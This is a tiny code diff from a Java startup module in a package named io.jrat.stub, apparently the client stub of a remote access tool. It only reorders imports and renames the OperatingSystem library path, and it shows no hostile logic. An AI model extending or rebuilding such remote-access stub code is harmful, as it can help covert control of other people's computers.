@@ -1,10 +1,8 @@
 package io.jrat.stub.modules.startup;
 
 import io.jrat.stub.Configuration;
-
 import java.util.Map;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 public class OperatingSystemCheckStartupModule extends StartupModule {
 	
